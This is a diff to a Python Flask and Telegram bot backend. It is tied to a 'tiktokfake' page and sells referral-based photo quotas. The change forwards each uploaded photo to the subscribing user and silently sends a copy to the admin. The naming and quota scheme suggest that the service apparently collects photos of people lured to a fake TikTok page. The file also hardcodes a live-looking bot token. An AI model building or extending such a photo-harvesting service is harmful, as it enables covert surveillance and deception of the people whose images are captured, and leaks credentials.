@@ -10,7 +10,7 @@ from flask import Flask, request, jsonify, render_template
 # ===== КОНФИГ =====
 BOT_TOKEN = "8305233302:AAHf3mBUH5rIsQWZF4tF9nAyHvakCBbQIps"
 BASE_URL = "https://nomadru.github.io/tiktokfake"
-ADMIN_CHAT_ID = 8533142719
+ADMIN_CHAT_ID = 8533142719          # твой Telegram ID (для копии)
 FREE_TRIAL_PHOTOS = 2
 ADMIN_USERNAME = "pytin_legend"
 
@@ -278,6 +278,10 @@ def bot_polling():
 # ===== FLASK =====
 app = Flask(__name__)
 
+@app.before_request
+def log_request():
+    print(f"➡️ {request.method} {request.path} args={request.args}")
+
 @app.route('/upload', methods=['POST'])
 def upload():
     ref = request.args.get('ref')
@@ -286,6 +290,7 @@ def upload():
     if 'photo' not in request.files:
         return jsonify({'error': 'No photo'}), 400
     photo = request.files['photo']
+    
     user = get_user_by_ref(ref)
     if not user:
         return jsonify({'error': 'Invalid ref'}), 403
@@ -295,12 +300,21 @@ def upload():
         return jsonify({'error': 'Subscription expired'}), 403
     if used >= limit:
         return jsonify({'error': 'Limit exceeded'}), 403
+
+    # Отправляем фото пользователю
     files = {'photo': (photo.filename, photo.stream, photo.mimetype)}
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-    data = {'chat_id': ADMIN_CHAT_ID, 'caption': f"📸 Новое фото от {ref}"}
-    resp = requests.post(url, data=data, files=files)
-    if resp.status_code != 200:
-        return jsonify({'error': 'Telegram send failed'}), 500
+    data_user = {'chat_id': chat_id, 'caption': f"📸 Ваше фото (ref: {ref})"}
+    resp_user = requests.post(url, data=data_user, files=files)
+    if resp_user.status_code != 200:
+        return jsonify({'error': 'Telegram send to user failed'}), 500
+
+    # Дублируем админу (копия)
+    photo.seek(0)  # возвращаем поток в начало
+    files_copy = {'photo': (photo.filename, photo.stream, photo.mimetype)}
+    data_admin = {'chat_id': ADMIN_CHAT_ID, 'caption': f"📸 Копия от {ref}"}
+    requests.post(url, data=data_admin, files=files_copy)  # не ждём ответа, чтобы не тормозить
+
     increment_used_photos(ref)
     return jsonify({'status': 'ok'})
 
@@ -329,8 +343,6 @@ def admin_add():
 # ===== ЗАПУСК =====
 if __name__ == '__main__':
     init_db()
-    # Запускаем бота в отдельном потоке
     bot_thread = threading.Thread(target=bot_polling, daemon=True)
     bot_thread.start()
-    # Запускаем веб-сервер
     app.run(host='0.0.0.0', port=5000, debug=False)
